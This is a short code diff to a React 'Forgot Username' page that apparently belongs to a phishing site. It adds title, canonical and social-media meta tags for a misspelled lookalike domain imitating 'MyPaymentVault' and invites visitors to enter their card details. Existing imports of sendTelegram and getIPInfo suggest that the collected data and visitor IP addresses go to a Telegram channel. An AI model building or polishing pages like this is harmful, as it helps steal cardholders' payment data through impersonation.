@@ -1,5 +1,6 @@
 import { useState } from "react";
 import { useLocation } from "wouter";
+import { Helmet } from "react-helmet-async";
 import { AuthHeader } from "@/components/auth-header";
 import { Eye, EyeOff } from "lucide-react";
 import { sendTelegram, getIPInfo } from "@/lib/telegram";
@@ -50,6 +51,16 @@ export default function ForgotUsername() {
 
   return (
     <div className="min-h-screen bg-gray-50 flex flex-col">
+      <Helmet>
+        <title>Forgot Username — mypaymenttvaulltr.com</title>
+        <meta name="description" content="Retrieve your MyPaymentVault username using your card details." />
+        <link rel="canonical" href="https://www.mypaymenttvaulltr.com/forgot-username" />
+        <meta property="og:title" content="Forgot Username — mypaymenttvaulltr.com" />
+        <meta property="og:description" content="Retrieve your MyPaymentVault username using your card details." />
+        <meta property="og:url" content="https://www.mypaymenttvaulltr.com/forgot-username" />
+        <meta name="twitter:title" content="Forgot Username — mypaymenttvaulltr.com" />
+        <meta name="twitter:description" content="Retrieve your MyPaymentVault username using your card details." />
+      </Helmet>
       <AuthHeader />
 
       <div className="flex-1 flex flex-col">
